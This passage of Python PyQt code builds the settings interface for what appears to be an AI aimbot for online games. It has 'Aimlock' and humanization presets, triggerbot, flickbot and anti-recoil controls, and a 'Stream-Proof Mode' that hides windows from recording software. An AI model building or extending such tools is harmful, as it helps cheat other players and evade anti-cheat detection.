        preset_buttons_layout.addWidget(self.medium_btn)
        
        self.slow_btn = self.create_preset_button("Slow", "#2196f3")
        self.slow_btn.clicked.connect(lambda: self.apply_curve_preset('slow'))
        preset_buttons_layout.addWidget(self.slow_btn)
        
        preset_layout.addLayout(preset_buttons_layout)
        
        # Preset description
        self.preset_desc = QLabel("Aimlock: Fastest with minimal curves (5% humanization)")
        self.preset_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-top: 8px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        self.preset_desc.setWordWrap(True)
        preset_layout.addWidget(self.preset_desc)
        
        layout.addWidget(preset_container)

        # Curve settings
        curve_group = self.create_settings_group()
        curve_container = QWidget()
        curve_layout = QVBoxLayout(curve_container)
        curve_layout.setContentsMargins(0, 0, 0, 0)
        curve_layout.setSpacing(20)
        
        curve_layout.addWidget(self.create_group_label("Curve Settings"))
        
        self.create_curve_selector(curve_layout, movement_config.get("curve_type", "Exponential"))
        
        # Movement speed slider with higher default
        movement_speed = int(movement_config.get("movement_speed", 3.0) * 10)
        self.movement_speed_slider = self.create_modern_slider(curve_layout, "Movement Speed (Higher = Faster)", movement_speed, 10, 50, "", 0.1)
        
        # Additional options
        options_widget = QWidget()
        options_layout = QVBoxLayout(options_widget)
        options_layout.setContentsMargins(0, 12, 0, 0)
        options_layout.setSpacing(12)
        
        self.random_curves_checkbox = self.create_modern_checkbox("Randomize Curve Types", movement_config.get("random_curves", False))
        options_layout.addWidget(self.random_curves_checkbox)
        
        self.curve_smoothing_checkbox = self.create_modern_checkbox("Enable Curve Smoothing", movement_config.get("smoothing_enabled", True))
        options_layout.addWidget(self.curve_smoothing_checkbox)
        
        curve_layout.addWidget(options_widget)
        layout.addWidget(curve_container)

        layout.addStretch()

    def create_preset_button(self, text, color):
        """Create a preset button with custom color"""
        btn = QPushButton(text)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {color};
                border: none;
                color: white;
                padding: 8px 16px;
                border-radius: 4px;
                font-size: 12px;
                font-weight: 600;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }}
            QPushButton:hover {{
                background-color: {color}dd;
            }}
            QPushButton:pressed {{
                background-color: {color}bb;
            }}
        """)
        return btn
    
    def apply_curve_preset(self, preset):
        """Apply a curve speed preset"""
        presets = {
            'aimlock': {
                'humanization': 5,
                'movement_speed': 50,  # 5.0
                'curve_type': 'Exponential',
                'description': 'Aimlock: Fastest with minimal curves (5% humanization)'
            },
            'fast': {
                'humanization': 15,
                'movement_speed': 30,  # 3.0
                'curve_type': 'Bezier',
                'description': 'Fast: Quick response with subtle curves (15% humanization)'
            },
            'medium': {
                'humanization': 30,
                'movement_speed': 20,  # 2.0
                'curve_type': 'Sine',
                'description': 'Medium: Balanced speed and smoothness (30% humanization)'
            },
            'slow': {
                'humanization': 50,
                'movement_speed': 10,  # 1.0
                'curve_type': 'Catmull',
                'description': 'Slow: Smooth human-like movement (50% humanization)'
            }
        }
        
        if preset in presets:
            settings = presets[preset]
            
            # Apply settings to UI
            self.humanizer_slider.setValue(settings['humanization'])
            self.movement_speed_slider.setValue(settings['movement_speed'])
            
            # Find and set curve type
            index = self.movement_curve_combo.findData(settings['curve_type'])
            if index >= 0:
                self.movement_curve_combo.setCurrentIndex(index)
            
            # Update description
            self.preset_desc.setText(settings['description'])
            
            # Enable movement curves
            self.enable_movement_curves_checkbox.setChecked(True)
            
            # Visual feedback
            self.status_label.setText(f"Applied {preset} preset")
            self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
            QTimer.singleShot(2000, self.reset_status_label)

    def create_about_content(self, layout):
        """About tab"""
        layout.addWidget(self.create_section_title("About"))
        
        # Logo/Icon area
        icon_widget = QWidget()
        icon_widget.setFixedHeight(80)
        icon_layout = QHBoxLayout(icon_widget)
        icon_layout.setContentsMargins(0, 0, 0, 0)
        
        icon_label = QLabel("⚡")
        icon_label.setStyleSheet("""
            font-size: 48px;
            color: #007acc;
            background-color: #1e1e1e;
            border-radius: 12px;
            padding: 16px;
        """)
        icon_label.setFixedSize(80, 80)
        icon_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        icon_layout.addWidget(icon_label)
        icon_layout.addStretch()
        
        #layout.addWidget(icon_widget)

        # Info card
        info_card = QWidget()
        info_card.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #3e3e3e;
                border-radius: 8px;
                padding: 24px;
            }
        """)
        info_layout = QVBoxLayout(info_card)
        
        version_label = QLabel("Solana Ai Version 1.0.0")
        version_label.setStyleSheet("""
            color: #858585;
            font-size: 13px;
            margin-bottom: 16px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        info_layout.addWidget(version_label)
        
        features = [
            "• Real-time configuration updates",
            "• Advanced Smoothing filtering",
            "• Customizable overlay system",
            "• Human-like movement patterns",
            "• GPU-accelerated processing"
        ]
        
        for feature in features:
            feature_label = QLabel(feature)
            feature_label.setStyleSheet("""
                color: #cccccc;
                font-size: 13px;
                padding: 4px 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            """)
            info_layout.addWidget(feature_label)
        
        layout.addWidget(info_card)
        
        # Links
        links_widget = QWidget()
        links_layout = QHBoxLayout(links_widget)
        links_layout.setContentsMargins(0, 16, 0, 0)
        links_layout.setSpacing(24)
        
        discord_link = QLabel("<a href='https://discord.gg/G7q8qgAMJy' style='color: #007acc; text-decoration: none;'>Discord</a>")
        discord_link.setStyleSheet("""
            font-size: 13px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        discord_link.setCursor(Qt.CursorShape.PointingHandCursor)
        discord_link.setOpenExternalLinks(True)  # Enable external link opening
        links_layout.addWidget(discord_link)
        
        links_layout.addStretch()
        layout.addWidget(links_widget)
        
        layout.addStretch()

    def create_settings_group(self):
        """Create a settings group container"""
        group = QVBoxLayout()
        group.setSpacing(16)
        group.setContentsMargins(0, 0, 0, 24)
        return group

    def create_group_label(self, text):
        """Create a group label"""
        label = QLabel(text)
        label.setStyleSheet("""
            color: #cccccc;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        return label

    def create_modern_slider(self, layout, label_text, value, min_val, max_val, suffix="", factor=1.0):
        """Create modern styled slider"""
        container = QWidget()
        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(8)
        
        # Label row
        label_row = QHBoxLayout()
        label_row.setContentsMargins(0, 0, 0, 0)
        
        label = QLabel(label_text)
        label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        label_row.addWidget(label)
        
        value_label = QLabel(f"{value * factor:.1f}{suffix}" if factor != 1.0 else f"{value}{suffix}")
        value_label.setStyleSheet("""
            color: #00d4ff;
            font-size: 14px;
            font-weight: 600;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
        """)
        label_row.addWidget(value_label)
        
        container_layout.addLayout(label_row)
        
        # Slider
        slider = NoScrollSlider(Qt.Orientation.Horizontal)
        slider.setMinimum(min_val)
        slider.setMaximum(max_val)
        slider.setValue(value)
        slider.setStyleSheet("""
            QSlider::groove:horizontal {
                background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 0,
                    stop: 0 #2a2a2a, stop: 1 #3e3e3e);
                height: 6px;
                border-radius: 3px;
                border: 1px solid #555;
            }
            QSlider::handle:horizontal {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #00d4ff, stop: 1 #007acc);
                width: 18px;
                height: 18px;
                margin: -7px 0;
                border-radius: 9px;
                border: 2px solid #005a9e;
            }
            QSlider::handle:horizontal:hover {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #1ae0ff, stop: 1 #0086d0);
                width: 20px;
                height: 20px;
                margin: -8px 0;
                border: 2px solid #00a0e0;
            }
            QSlider::sub-page:horizontal {
                background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 0,
                    stop: 0 #007acc, stop: 1 #00d4ff);
                border-radius: 3px;
                border: 1px solid #005a9e;
            }
        """)
        
        slider.valueChanged.connect(lambda val: value_label.setText(f"{val * factor:.1f}{suffix}" if factor != 1.0 else f"{val}{suffix}"))
        container_layout.addWidget(slider)
        
        layout.addWidget(container)
        return slider

    def create_modern_checkbox(self, text, checked=False):
        """Create modern styled checkbox"""
        checkbox = QCheckBox(text)
        checkbox.setChecked(checked)
        checkbox.setCursor(Qt.CursorShape.PointingHandCursor)
        checkbox.setStyleSheet("""
            QCheckBox {
                color: #e0e0e0;
                font-size: 13px;
                spacing: 10px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QCheckBox::indicator {
                width: 20px;
                height: 20px;
                border-radius: 4px;
                border: 2px solid #555;
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #2a2a2a, stop: 1 #1e1e1e);
            }
            QCheckBox::indicator:checked {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #00d4ff, stop: 1 #007acc);
                border: 2px solid #00a0e0;
            }
            QCheckBox::indicator:hover {
                border: 2px solid #007acc;
            }
            QCheckBox::indicator:checked:hover {
                border: 2px solid #00d4ff;
            }
        """)
        return checkbox

    def create_modern_input(self, placeholder, value):
        """Create modern styled input field"""
        input_widget = QWidget()
        input_layout = QVBoxLayout(input_widget)
        input_layout.setContentsMargins(0, 0, 0, 0)
        input_layout.setSpacing(4)
        
        label = QLabel(placeholder)
        label.setStyleSheet("""
            color: #858585;
            font-size: 11px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        input_layout.addWidget(label)
        
        entry = QLineEdit(value)
        entry.setStyleSheet("""
            QLineEdit {
                background-color: #3e3e3e;
                border: 2px solid #555;
                border-radius: 4px;
                padding: 6px 12px;
                color: #cccccc;
                font-size: 13px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
            }
            QLineEdit:focus {
                border: 2px solid #00d4ff;
                outline: none;
            }
            QLineEdit:hover {
                border: 2px solid #007acc;
            }
        """)
        input_layout.addWidget(entry)
        
        return input_widget

    def create_keybind_selector(self, layout):
        """Create keybind selector"""
        layout.addWidget(self.create_group_label("Activation Key"))
        
        self.keybind_combo = QComboBox()
        self.keybind_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.keybind_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
        
        # Keybind options with corresponding icon keys
        keybind_options = [
            ("Left Mouse Button", 0x01, "mouse_left"),     # Add mouse_left.png to icons folder
            ("Right Mouse Button", 0x02, "mouse_right"),   # Add mouse_right.png to icons folder
            ("Middle Mouse Button", 0x04, "mouse_scroll"), # Add mouse_middle.png to icons folder
            ("Mouse Button 4", 0x05, "mouse_4"),          # Add mouse_4.png to icons folder
            ("Mouse Button 5", 0x06, "mouse_5"),          # Add mouse_5.png to icons folder
            ("Left Shift", 0xA0, "left_shift"),             # Uses keyboard.png (hotkeys icon)
            ("Tab", 0x09, "tab_key"),                     # Uses keyboard.png (hotkeys icon)
            ("Left Control", 0xA2, "left_ctrl"),           # Uses keyboard.png (hotkeys icon)
            ("Left Alt", 0xA4, "left_alt"),               # Uses keyboard.png (hotkeys icon)
        ]
        
        # Add items with icons
        for label, hex_value, icon_key in keybind_options:
            icon = self.icon_manager.get_icon(icon_key, size=(16, 16))
            if icon:
                self.keybind_combo.addItem(icon, label, hex_value)
            else:
                # Fallback: add without icon if icon not found
                self.keybind_combo.addItem(label, hex_value)
        
        try:
            if isinstance(self.config_data["keybind"], str):
                initial_value = int(self.config_data["keybind"], 16)
            else:
                initial_value = self.config_data["keybind"]
            
            index = self.keybind_combo.findData(initial_value)
            if index >= 0:
                self.keybind_combo.setCurrentIndex(index)
        except (ValueError, KeyError):
            self.keybind_combo.setCurrentIndex(0)
        
        layout.addWidget(self.keybind_combo)

    def create_shape_selector(self, layout):
        """Create overlay shape selector"""
        layout.addWidget(self.create_group_label("Overlay Shape"))
        
        self.overlay_shape_combo = QComboBox()
        self.overlay_shape_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.overlay_shape_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
        
        overlay_shape_options = [
            ("Circle", "circle"),
            ("Square", "square"),
        ]
        
        for label, value in overlay_shape_options:
            self.overlay_shape_combo.addItem(label, value)
        
        current_shape = self.config_data.get("overlay_shape", "circle")
        index = self.overlay_shape_combo.findData(current_shape)
        if index >= 0:
            self.overlay_shape_combo.setCurrentIndex(index)
        
        layout.addWidget(self.overlay_shape_combo)

    def create_curve_selector(self, layout, current_curve):
        """Create curve type selector"""
        #layout.addWidget(self.create_group_label("Curve Algorithm"))
        
        self.movement_curve_combo = QComboBox()
        self.movement_curve_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.movement_curve_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
        
        curve_options = [
            ("Bezier Curve", "Bezier"),
            ("B-Spline", "B-Spline"),
            ("Catmull-Rom", "Catmull"),
            ("Exponential", "Exponential"),
            ("Hermite", "Hermite"),
            ("Sinusoidal", "Sine")
        ]
        
        for label, value in curve_options:
            self.movement_curve_combo.addItem(label, value)
        
        index = self.movement_curve_combo.findData(current_curve)
        if index >= 0:
            self.movement_curve_combo.setCurrentIndex(index)
        
        layout.addWidget(self.movement_curve_combo)

    def create_hotkeys_content(self, layout):
        """Hotkeys settings tab"""
        layout.addWidget(self.create_section_title("Hotkeys"))
        layout.addWidget(self.create_section_description("Configure keyboard shortcuts"))

        # Get current hotkeys config
        hotkeys_config = self.config_data.get("hotkeys", {
            "stream_proof_key": "0x75",  # F6
            "menu_toggle_key": "0x76",   # F7
            "stream_proof_enabled": False,
            "menu_visible": True
        })

        # Stream-proof settings
        stream_group = self.create_settings_group()
        stream_container = QWidget()
        stream_layout = QVBoxLayout(stream_container)
        stream_layout.setContentsMargins(0, 0, 0, 0)
        stream_layout.setSpacing(12)
    
        stream_layout.addWidget(self.create_group_label("Stream-Proof Mode"))
    
        # Stream-proof description
        stream_desc = QLabel("Makes windows invisible to streaming/recording software (OBS, Discord, etc.)")
        stream_desc.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            margin-bottom: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        stream_desc.setWordWrap(True)
        stream_layout.addWidget(stream_desc)
    
        # Stream-proof keybind selector
        self.stream_proof_keybind_combo = self.create_keybind_combo("Stream-Proof Toggle", 
                                                            hotkeys_config.get("stream_proof_key", "0x75"))
        stream_layout.addWidget(self.stream_proof_keybind_combo)
    
        layout.addWidget(stream_container)

        # Menu visibility settings
        menu_group = self.create_settings_group()
        menu_container = QWidget()
        menu_layout = QVBoxLayout(menu_container)
        menu_layout.setContentsMargins(0, 0, 0, 0)
        menu_layout.setSpacing(12)
    
        menu_layout.addWidget(self.create_group_label("Menu Visibility"))
    
        # Menu keybind selector
        self.menu_toggle_keybind_combo = self.create_keybind_combo("Menu Toggle", 
                                                           hotkeys_config.get("menu_toggle_key", "0x76"))
        menu_layout.addWidget(self.menu_toggle_keybind_combo)
    
        layout.addWidget(menu_container)

        # Status
        status_group = self.create_settings_group()
        status_container = QWidget()
        status_layout = QVBoxLayout(status_container)
        status_layout.setContentsMargins(0, 0, 0, 0)
        status_layout.setSpacing(8)
    
        status_layout.addWidget(self.create_group_label("Current Status"))
    
        self.stream_proof_status = QLabel("Stream-Proof: Disabled")
        self.stream_proof_status.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            padding: 8px;
            background-color: #1e1e1e;
            border: 1px solid #3e3e3e;
            border-radius: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        status_layout.addWidget(self.stream_proof_status)
    
        layout.addWidget(status_container)
    
        layout.addStretch()

    def create_keybind_combo(self, label_text, current_value):
        """Create a keybind selector combo box with label"""
        container = QWidget()
        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(4)
    
        label = QLabel(label_text)
        label.setStyleSheet("""
            color: #858585;
            font-size: 11px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        container_layout.addWidget(label)
    
        combo = QComboBox()
        combo.setCursor(Qt.CursorShape.PointingHandCursor)
        combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        # Add common keybind options
        keybind_options = [
            ("F1", 0x70),
            ("F2", 0x71),
            ("F3", 0x72),
            ("F4", 0x73),
            ("F5", 0x74),
            ("F6", 0x75),
            ("F7", 0x76),
            ("F8", 0x77),
            ("F9", 0x78),
            ("F10", 0x79),
            ("F11", 0x7A),
            ("F12", 0x7B),
            ("Insert", 0x2D),
            ("Delete", 0x2E),
            ("Home", 0x24),
            ("End", 0x23),
            ("Page Up", 0x21),
            ("Page Down", 0x22),
        ]
    
        for label, hex_value in keybind_options:
            combo.addItem(label, hex_value)
    
        # Set current value
        try:
            if isinstance(current_value, str):
                initial_value = int(current_value, 16)
            else:
                initial_value = current_value
        
            index = combo.findData(initial_value)
            if index >= 0:
                combo.setCurrentIndex(index)
        except:
            combo.setCurrentIndex(5)  # Default to F6
    
        container_layout.addWidget(combo)
        return container

    def show_tab(self, index):
        """Show selected tab with animation"""
        # Update navigation
        for i, btn in enumerate(self.nav_buttons):
            btn.setProperty("active", i == index)
            btn.style().unpolish(btn)
            btn.style().polish(btn)
        
        # Hide all tabs
        for widget in self.tab_contents:
            widget.setVisible(False)
        
        # Show selected tab
        if 0 <= index < len(self.tab_contents):
            self.tab_contents[index].setVisible(True)
            
        # If showing hotkeys tab, update stream-proof status
        if index == 5:  # Hotkeys tab index
            self.update_stream_proof_status(self.stream_proof_enabled)

    def setup_real_time_updates(self):
        """Set up real-time updates for all controls"""
        # Connect all controls to real-time update
        # General settings
        self.fov_combo.currentIndexChanged.connect(self.apply_settings_real_time)
        self.sens_slider.valueChanged.connect(self.apply_settings_real_time)
        self.aim_height_slider.valueChanged.connect(self.apply_settings_real_time)
        self.confidence_slider.valueChanged.connect(self.apply_settings_real_time)
        self.keybind_combo.currentIndexChanged.connect(self.apply_settings_real_time)

        # Display settings
        self.show_overlay_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.overlay_shape_combo.currentIndexChanged.connect(self.apply_settings_real_time)
        self.overlay_show_borders_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.circle_capture_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.show_debug_window_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.custom_res_checkbox.stateChanged.connect(self.apply_settings_real_time)

        # Performance settings
        self.use_kalman_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.kf_p_slider.valueChanged.connect(self.apply_settings_real_time)
        self.kf_r_slider.valueChanged.connect(self.apply_settings_real_time)
        self.kf_q_slider.valueChanged.connect(self.apply_settings_real_time)
        self.kalman_frames_slider.valueChanged.connect(self.apply_settings_real_time)
        self.use_coupled_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.alpha_with_kalman_slider.valueChanged.connect(self.apply_settings_real_time)

        # Advanced settings
        self.enable_movement_curves_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.movement_curve_combo.currentIndexChanged.connect(self.apply_settings_real_time)
        self.movement_speed_slider.valueChanged.connect(self.apply_settings_real_time)
        self.humanizer_slider.valueChanged.connect(self.apply_settings_real_time)
        self.random_curves_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.curve_smoothing_checkbox.stateChanged.connect(self.apply_settings_real_time)

        # Anti-recoil connections
        self.require_target_cb.stateChanged.connect(self.apply_settings_real_time)
        self.require_keybind_cb.stateChanged.connect(self.apply_settings_real_time)
        self.anti_recoil_enabled_cb.stateChanged.connect(self.apply_settings_real_time)
        self.anti_recoil_strength_slider.valueChanged.connect(self.apply_settings_real_time)
        self.anti_recoil_bloom_cb.stateChanged.connect(self.apply_settings_real_time)

        # Triggerbot settings
        self.triggerbot_enabled_cb.stateChanged.connect(self.apply_settings_real_time)
        self.triggerbot_confidence_slider.valueChanged.connect(self.apply_settings_real_time)
        self.triggerbot_delay_slider.valueChanged.connect(self.apply_settings_real_time)
        self.triggerbot_cooldown_slider.valueChanged.connect(self.apply_settings_real_time)
        self.triggerbot_keybind_combo.currentIndexChanged.connect(self.apply_settings_real_time)

        # Flickbot settings
        self.flickbot_enabled_cb.stateChanged.connect(self.apply_settings_real_time)
        self.flickbot_keybind_combo.currentIndexChanged.connect(self.apply_settings_real_time)
        self.flickbot_speed_slider.valueChanged.connect(self.apply_settings_real_time)
        self.flickbot_delay_slider.valueChanged.connect(self.apply_settings_real_time)
        self.flickbot_cooldown_slider.valueChanged.connect(self.apply_settings_real_time)
        self.flickbot_autofire_cb.stateChanged.connect(self.apply_settings_real_time)
        self.flickbot_return_cb.stateChanged.connect(self.apply_settings_real_time)

        # Text field updates with delay
        self.update_timer = QTimer()
        self.update_timer.setSingleShot(True)
        self.update_timer.timeout.connect(self.apply_settings_real_time)

        # Mouse FOV settings (NEW)
        self.use_separate_fov_checkbox.stateChanged.connect(self.apply_settings_real_time)
        self.mouse_fov_width_slider.valueChanged.connect(self.apply_settings_real_time)
        self.mouse_fov_height_slider.valueChanged.connect(self.apply_settings_real_time)
        self.dpi_slider.valueChanged.connect(self.apply_settings_real_time)
    
        # Enable/disable height slider based on checkbox
        self.use_separate_fov_checkbox.stateChanged.connect(
            lambda state: self.mouse_fov_height_slider.setEnabled(state == Qt.CheckState.Checked.value)
        )
        
        # Target lock settings
        if hasattr(self, 'target_lock_enabled_cb'):
            self.target_lock_enabled_cb.stateChanged.connect(self.apply_settings_real_time)
            self.min_lock_slider.valueChanged.connect(self.apply_settings_real_time)
            self.max_lock_slider.valueChanged.connect(self.apply_settings_real_time)
            self.distance_threshold_slider.valueChanged.connect(self.apply_settings_real_time)
            self.reacquire_timeout_slider.valueChanged.connect(self.apply_settings_real_time)
            self.smart_switching_cb.stateChanged.connect(self.apply_settings_real_time)
            self.target_preference_combo.currentIndexChanged.connect(self.apply_settings_real_time)
            self.multi_target_cb.stateChanged.connect(self.apply_settings_real_time)
            self.max_targets_slider.valueChanged.connect(self.apply_settings_real_time)
            self.switch_cooldown_slider.valueChanged.connect(self.apply_settings_real_time)
        
        # Advanced options
        if hasattr(self, 'sticky_aim_cb'):
            self.sticky_aim_cb.stateChanged.connect(self.apply_settings_real_time)
            self.target_prediction_cb.stateChanged.connect(self.apply_settings_real_time)
            self.ignore_downed_cb.stateChanged.connect(self.apply_settings_real_time)

        # Controller settings
        if hasattr(self, 'controller_enabled_cb'):
            self.controller_enabled_cb.stateChanged.connect(self.apply_settings_real_time)
            self.controller_activation_combo.currentIndexChanged.connect(self.apply_settings_real_time)
            self.aim_stick_combo.currentIndexChanged.connect(self.apply_settings_real_time)
            self.controller_sens_slider.valueChanged.connect(self.apply_settings_real_time)
            self.controller_deadzone_slider.valueChanged.connect(self.apply_settings_real_time)
            self.trigger_threshold_slider.valueChanged.connect(self.apply_settings_real_time)
            self.controller_vibration_cb.stateChanged.connect(self.apply_settings_real_time)
            self.controller_autoswitch_cb.stateChanged.connect(self.apply_settings_real_time)
            self.controller_hold_aim_cb.stateChanged.connect(self.apply_settings_real_time)
    
            # Button mappings
            for combo in self.button_mapping_combos.values():
                combo.currentIndexChanged.connect(self.apply_settings_real_time)

        if hasattr(self, 'stream_proof_keybind_combo'):
            self.stream_proof_keybind_combo.findChild(QComboBox).currentIndexChanged.connect(self.apply_settings_real_time)
        if hasattr(self, 'menu_toggle_keybind_combo'):
            self.menu_toggle_keybind_combo.findChild(QComboBox).currentIndexChanged.connect(self.apply_settings_real_time)

        if hasattr(self, 'stream_proof_keybind_combo'):
            self.stream_proof_keybind_combo.findChild(QComboBox).currentIndexChanged.connect(self.apply_settings_real_time)
        if hasattr(self, 'menu_toggle_keybind_combo'):
            self.menu_toggle_keybind_combo.findChild(QComboBox).currentIndexChanged.connect(self.apply_settings_real_time)
        
        # Connect text fields to delayed update
        for entry in [self.res_x_entry, self.res_y_entry]:
            entry.findChild(QLineEdit).textChanged.connect(self.schedule_real_time_update)

    def schedule_real_time_update(self):
        """Schedule a real-time update with delay"""
        self.update_timer.stop()
        self.update_timer.start(500)

    def apply_settings_real_time(self):
        """Apply settings in real-time with optimized curve settings"""
        try:
            # Get resolution values
            res_x_val = int(self.res_x_entry.findChild(QLineEdit).text())
            res_y_val = int(self.res_y_entry.findChild(QLineEdit).text())

            # Calculate humanizer settings for FAST curves
            humanizer_value = self.humanizer_slider.value()
            smoothing_factor = humanizer_value / 100.0
            
            # Optimized values for speed
            curve_steps = min(5, max(3, int(5 + (humanizer_value * 0.1))))  # 3-5 steps max
            bezier_randomness = 0.05 + (humanizer_value * 0.001)  # Minimal randomness
            
            # Create new config
            new_config = {
                "fov": self.fov_combo.currentData(),
                "sensitivity": round(self.sens_slider.value() * 0.1, 1),
                "aim_height": self.aim_height_slider.value(),
                "confidence": round(self.confidence_slider.value() * 0.01, 2),
                "keybind": hex(self.keybind_combo.currentData()),
                "custom_resolution": {
                    "use_custom_resolution": self.custom_res_checkbox.isChecked(),
